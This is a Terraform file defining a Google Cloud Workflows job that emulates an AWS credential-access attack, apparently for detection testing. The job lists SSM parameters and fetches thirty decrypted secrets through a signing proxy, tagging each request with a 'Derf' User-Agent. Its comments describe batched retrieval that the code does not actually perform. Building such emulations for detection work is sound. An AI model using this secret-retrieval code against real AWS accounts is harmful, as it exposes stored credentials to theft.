data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_ssm_retrieve_securestring" {
  name            = "aws-ssm-retrieve-securestring-srt"
  description     = "A workflow intended to match the functionality of the  Status Red Team attack technique 'AWS Retrieve and Decrypt SSM Parameters' documented here: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## Retrieves and decrypts a high number (30) of SSM Parameters available in an AWS region.
## First, this attack runs ssm:DescribeParameters to list SSM Parameters in the current region
## Next, ssm:GetParameters API is used to batch of 10 (max supported value) and 
## retrieve the values of the SSM Parameters

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "Derf-SSM-Retrieve-SecureString-WORKFLOWEXECUTIONID"

######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - user: $${args.user}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  

    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - DescribeParameters:
        call: DescribeParameters
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: DescribeParametersResponse
    - GetParameters:
        call: GetParameters
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: GetParametersResponse
    - return:
        return: 
          - $${GetParametersResponse}     


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
DescribeParameters:
  params: [user, appEndpoint]
  steps: 
    - DescribeParameters:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: ssm.us-east-1.amazonaws.com
              REGION: "us-east-1"
              SERVICE: "ssm" 
              ENDPOINT: "https://ssm.us-east-1.amazonaws.com"
              BODY: "{}"
              UA: '$${"Derf-SSM-Retrieve-SecureString=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
              CONTENT: "application/x-amz-json-1.1"
              USER: $${user}
              VERB: POST
              TARGET: AmazonSSM.DescribeParameters
        result: response

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: error
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS Retrieve and Decrypt SSM Parameters Attack"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Retrieve and Decrypt SSM Parameters Attack"            
 
GetParameters:
  params: [user, appEndpoint]
  steps:  
    - assignStep:
        assign:
          - sum: 0
    - loopStep:
        for:
          value: v                    
          range: [1, 30]               
          steps:  
            - buildQuery:
                assign:
                - a: '{"Name": "/credentials/derf/credentials-'
                - b: '", "WithDecryption": true}'
                - c: '$${a+v+b}'          
            - GetParameter:
                call: http.post
                args:
                  url: '$${appEndpoint+"/submitRequest"}'
                  auth:
                      type: OIDC
                  headers:
                    Content-Type: application/json
                  body:
                      HOST: ssm.us-east-1.amazonaws.com
                      REGION: "us-east-1"
                      SERVICE: "ssm" 
                      ENDPOINT: "https://ssm.us-east-1.amazonaws.com"
                      BODY: '$${c}'
                      UA: '$${"Derf-SSM-Retrieve-SecureString=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                      CONTENT: "application/x-amz-json-1.1"
                      USER: $${user}
                      VERB: POST
                      TARGET: AmazonSSM.GetParameter
                result: response
            - sumStep:
                assign:
                  - sum: $${sum + v}
    - return:
        return: "SUCCESS - AWS Retrieve and Decrypt SSM Parameters"

  EOF

}